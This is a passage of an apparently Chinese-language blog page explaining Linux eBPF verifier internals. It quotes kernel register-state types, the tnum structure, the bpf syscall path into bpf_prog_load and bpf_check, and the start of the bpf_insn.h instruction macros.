</span></span><span class="line"><span class="cl">	<span class="k">enum</span> <span class="n">bpf_reg_liveness</span> <span class="n">live</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#39;t affect safety */</span>
</span></span><span class="line"><span class="cl">	<span class="kt">bool</span> <span class="n">precise</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><ul>
<li>bpf_reg_type</li>
</ul>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* types of values stored in eBPF registers */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* Pointer types represent:
</span></span></span><span class="line"><span class="cl"><span class="cm"> * pointer
</span></span></span><span class="line"><span class="cl"><span class="cm"> * pointer + imm
</span></span></span><span class="line"><span class="cl"><span class="cm"> * pointer + (u16) var
</span></span></span><span class="line"><span class="cl"><span class="cm"> * pointer + (u16) var + imm
</span></span></span><span class="line"><span class="cl"><span class="cm"> * if (range &gt; 0) then [ptr, ptr + range - off) is safe to access
</span></span></span><span class="line"><span class="cl"><span class="cm"> * if (id &gt; 0) means that some &#39;var&#39; was added
</span></span></span><span class="line"><span class="cl"><span class="cm"> * if (off &gt; 0) means that &#39;imm&#39; was added
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">enum</span> <span class="n">bpf_reg_type</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">NOT_INIT</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>         <span class="cm">/* nothing was written into register */</span>
</span></span><span class="line"><span class="cl">    <span class="n">SCALAR_VALUE</span><span class="p">,</span>         <span class="cm">/* reg doesn&#39;t contain a valid pointer */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_CTX</span><span class="p">,</span>         <span class="cm">/* reg points to bpf_context */</span>
</span></span><span class="line"><span class="cl">    <span class="n">CONST_PTR_TO_MAP</span><span class="p">,</span>     <span class="cm">/* reg points to struct bpf_map */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_MAP_VALUE</span><span class="p">,</span>     <span class="cm">/* reg points to map element value */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_MAP_VALUE_OR_NULL</span><span class="p">,</span><span class="cm">/* points to map elem value or NULL */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_STACK</span><span class="p">,</span>         <span class="cm">/* reg == frame_pointer + offset */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_PACKET_META</span><span class="p">,</span>     <span class="cm">/* skb-&gt;data - meta_len */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_PACKET</span><span class="p">,</span>         <span class="cm">/* reg points to skb-&gt;data */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_PACKET_END</span><span class="p">,</span>     <span class="cm">/* skb-&gt;data + headlen */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_FLOW_KEYS</span><span class="p">,</span>     <span class="cm">/* reg points to bpf_flow_keys */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_SOCKET</span><span class="p">,</span>         <span class="cm">/* reg points to struct bpf_sock */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_SOCKET_OR_NULL</span><span class="p">,</span>     <span class="cm">/* reg points to struct bpf_sock or NULL */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_SOCK_COMMON</span><span class="p">,</span>     <span class="cm">/* reg points to sock_common */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_SOCK_COMMON_OR_NULL</span><span class="p">,</span> <span class="cm">/* reg points to sock_common or NULL */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_TCP_SOCK</span><span class="p">,</span>     <span class="cm">/* reg points to struct tcp_sock */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_TCP_SOCK_OR_NULL</span><span class="p">,</span> <span class="cm">/* reg points to struct tcp_sock or NULL */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_TP_BUFFER</span><span class="p">,</span>     <span class="cm">/* reg points to a writable raw tp&#39;s buffer */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_XDP_SOCK</span><span class="p">,</span>     <span class="cm">/* reg points to struct xdp_sock */</span>
</span></span><span class="line"><span class="cl">    <span class="n">PTR_TO_BTF_ID</span><span class="p">,</span>         <span class="cm">/* reg points to kernel struct */</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><ul>
<li>struct tnum</li>
</ul>
<p>当reg是一个具体的数值（范围值），本结构代表真正的值。</p>
<p>当reg是一个指针，这代表了到被指向对象的偏移量。</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">tnum</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">u64</span> <span class="n">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">u64</span> <span class="n">mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="cp">#define TNUM(_v, _m)    (struct tnum){.value = _v, .mask = _m}
</span></span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="cm">/* A completely unknown value */</span>
</span></span><span class="line"><span class="cl"><span class="k">const</span> <span class="k">struct</span> <span class="n">tnum</span> <span class="n">tnum_unknown</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="p">.</span><span class="n">mask</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">};</span></span></span></code></pre></td></tr></table></div>
</div>
</div><h3 class="heading-element" id="源码"><span>源码</span>
  <a href="#%e6%ba%90%e7%a0%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 class="heading-element" id="bpf_prog_load"><span>bpf_prog_load</span>
  <a href="#bpf_prog_load" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>当我们调用<code>bpf</code>系统调用令它的<code>cmd = BPF_PROG_LOAD</code>时，会调用到函数<code>bpf_prog_load</code></p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//kernel/bpf/syscall.c
</span></span></span><span class="line"><span class="cl"><span class="nf">SYSCALL_DEFINE3</span><span class="p">(</span><span class="n">bpf</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">uattr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">......</span>
</span></span><span class="line"><span class="cl">	<span class="k">switch</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">......</span>
</span></span><span class="line"><span class="cl">	<span class="k">case</span> <span class="nl">BPF_PROG_LOAD</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">err</span> <span class="o">=</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="n">uattr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">......</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>其中会调用到函数<code>bpf_check</code>进行<code>ebpf verifier</code></p>
<h4 class="heading-element" id="bpf_check"><span>bpf_check</span>
  <a href="#bpf_check" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><h4 class="heading-element" id="check_subprogs"><span>check_subprogs</span>
  <a href="#check_subprogs" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><h3 class="heading-element" id="指令编写"><span>指令编写</span>
  <a href="#%e6%8c%87%e4%bb%a4%e7%bc%96%e5%86%99" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>在内核源码目录中定义了<code>samples/bpf/bpf_insn.h</code>，可以使用其中的宏指令来编写，比起直接用常数写，简化了很多</p>
<p>使用的时候，<code>include</code>进去即可。（这里加了个<code>BPF_CALL_FUNC</code>）</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* eBPF instruction mini library */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#ifndef __BPF_INSN_H
</span></span></span><span class="line"><span class="cl"><span class="cp">#define __BPF_INSN_H
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_insn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_ALU64_REG(OP, DST, SRC)				\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = 0 })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_ALU32_REG(OP, DST, SRC)				\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_ALU | BPF_OP(OP) | BPF_X,		\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = 0 })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_ALU64_IMM(OP, DST, IMM)				\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = IMM })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_ALU32_IMM(OP, DST, IMM)				\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_ALU | BPF_OP(OP) | BPF_K,		\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = IMM })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Short form of mov, dst_reg = src_reg */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_MOV64_REG(DST, SRC)					\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_ALU64 | BPF_MOV | BPF_X,		\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
